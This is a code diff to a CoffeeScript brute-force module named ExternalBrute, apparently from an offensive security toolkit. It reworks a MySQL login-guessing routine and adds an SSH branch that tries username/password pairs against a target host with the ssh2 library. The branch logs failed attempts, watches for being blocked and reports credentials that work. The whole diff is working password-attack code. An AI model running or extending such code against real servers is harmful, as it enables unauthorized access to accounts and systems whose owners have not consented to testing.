@@ -70,8 +70,8 @@ class ExternalBrute extends EventEmitter
 					isValid = false
 					Printer.error "ExternalBrute: Connection problem: #{evt}"
 			when "mysql"
-				isUP = true
 				mysql = require "mysql"
+
 				mysqlO =
 					host: target
 					port: port
@@ -80,22 +80,51 @@ class ExternalBrute extends EventEmitter
 
 				connection = mysql.createConnection mysqlO
 
-				if isUP
-					connection.connect (err) ->
-						if err
-							if /ER_ACCESS_DENIED_ERROR/.exec err
-								Printer.highlight "Last tested combination "
-								Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
-								Printer.removeCursor()
-							else
-								if /ER_HOST_IS_BLOCKED/.exec err
-									Printer.error "You've been blocked, quitting module..."
-									return
-								else
-									Printer.error "ExternalBrute: Connection problem #{err}"
+				connection.connect (err) ->
+					if err
+						if /ER_ACCESS_DENIED_ERROR/.exec err
+							Printer.highlight "Last tested combination "
+							Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
+							Printer.removeCursor()
 						else
-							connection.end()
-							printBrutePass testUser, testPass
+							if /ER_HOST_IS_BLOCKED/.exec err
+								Printer.error "You've been blocked, quitting module..."
+								return
+							else
+								Printer.error "ExternalBrute: Connection problem #{err}"
+					else
+						connection.end()
+						printBrutePass testUser, testPass
+			when "ssh"
+				ssh = require "ssh2"
+				c = new ssh()
+				isConnected = false
+
+				c.on "connect", ->
+					isConnected = true
+
+				c.on "ready", ->
+					printBrutePass testUser, testPass
+
+				c.on "error", (err) ->
+					if /Authentication failure/.exec err
+						Printer.highlight "Last tested combination "
+						Printer.normal "\"#{testUser}\"/\"#{testPass}\"\n"
+						Printer.removeCursor()
+
+				sshO =
+					host: target
+					port: port
+					username: testUser
+					password: testPass
+
+				callback = () =>
+					if not isConnected
+						Printer.error "ExternalBrute: Connection problem"
+
+				setTimeout callback, timeOut
+				c.connect sshO
+
 
 	brute = (target, port, testUser, passwords, delay, type) =>
 		# File with passwords is provided.
